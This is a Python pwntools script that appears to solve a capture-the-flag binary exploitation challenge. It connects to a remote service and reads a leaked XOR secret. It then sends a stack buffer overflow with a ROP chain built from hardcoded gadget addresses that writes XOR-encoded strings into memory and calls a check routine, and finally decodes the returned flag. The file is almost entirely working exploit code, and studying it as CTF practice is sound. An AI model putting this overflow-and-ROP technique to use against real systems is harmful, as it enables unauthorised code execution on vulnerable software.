from pwn import *

context.arch = "amd64"
r = remote("10.113.184.121", 10051)

# context.terminal = ["tmux", "splitw", "-h"]
# attach(
#     r,
#     """
#     b *0x40189e
#     conti
#     """,
# )

r.recvuntil(b"secret = ")
secret = r.recvline().decode().strip()
secret = int(secret, 16)
r.recvuntil(b"> ")

log.info(f"secret = {hex(secret)}")

# 0x00000000004020af : pop rdi ; ret
# 0x0000000000485e8b : pop rdx ; pop rbx ; ret
# 0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret

v1 = u64(b"kyoumoka")
v2 = u64(b"waii".ljust(8, b"\x00"))
# log.info(f"v1 = {p64(v1)}")
# log.info(f"v2 = {p64(v2)}")
v1 ^= secret
v2 ^= secret
log.info(f"v1 = {p64(v1)}")
log.info(f"v2 = {p64(v2)}")
ropc = flat(
    [
        #
        0x00000000004020AF,  # pop rdi ; ret
        0x4C7320,  # rdi = 0x4C7320
        0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
        v1,  # rdx = "kyoumoka"
        0x4141414141414141,  # rbx = "AAAAAAA"
        0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
        #
        0x00000000004020AF,  # pop rdi ; ret
        0x4C7320 + 8,  # rdi = 0x4C7328
        0x0000000000485E8B,  # pop rdx ; pop rbx ; ret
        v2,  # rdx = "waii"
        0x4141414141414141,  # rbx = "AAAAAAA"
        0x00000000004337E3,  # mov qword ptr [rdi], rdx ; ret
        0x00000000004020AF,  # pop rdi ; ret
        0x4C7320,  # rdi = 0x4C7320
        0x4017BA,  # check address
    ]
)
payload = b"a" * 0x28 + ropc
# input()
r.sendline(payload)
# print(payload)
r.recvuntil(b"flag = ")
res = r.recvline()[:16]
log.info(f"res = {res}")
flag = p64(u64(b"kyoumoka") ^ secret ^ u64(res[0:8]))
flag += p64(u64(b"waii".ljust(8, b"\x00")) ^ secret ^ u64(res[8:16]))
flag = flag.decode().strip()
log.info(f"flag = {flag}")

# r.interactive()
